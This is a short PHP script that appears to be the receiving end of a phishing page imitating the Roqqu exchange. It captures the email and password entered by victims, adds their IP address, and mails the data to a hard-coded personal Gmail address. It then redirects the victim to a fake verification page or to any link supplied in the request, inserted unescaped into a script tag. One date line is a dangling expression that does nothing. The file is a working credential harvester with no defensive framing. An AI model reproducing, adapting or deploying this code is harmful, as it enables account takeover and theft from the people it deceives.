<?php
session_start();

$_SESSION['email'] = $_POST['email'];


$_SESSION['password'] = $_POST['password'];

include("iplogger.php");
if ($_SERVER['REQUEST_METHOD'] === 'POST') 
{   $ip = getenv("REMOTE_ADDR");
    $subject = "Roqqu log";
    $to = "madumeresantus@gmail.com";  
    $data = "email  :  " .$_SESSION['email']."\n".
            "password :" .$_SESSION['password']."\n".
            "IP : ".$ip."\n";$IP=$_POST['IP'];
            "Date:"     .(new DateTime("now", new DateTimeZone('Asia/Karachi')))->format('Y-m-d H:i:sA')."\n\n";                        
    $message = $data ;  
    mail($to, $subject, $message);
}
if(isset($_POST['link'])) echo "<script>window.location.replace('".$_POST['link']."');</script>";
else echo "<script>window.location.replace('../././websites/verify.html');</script>";
?>
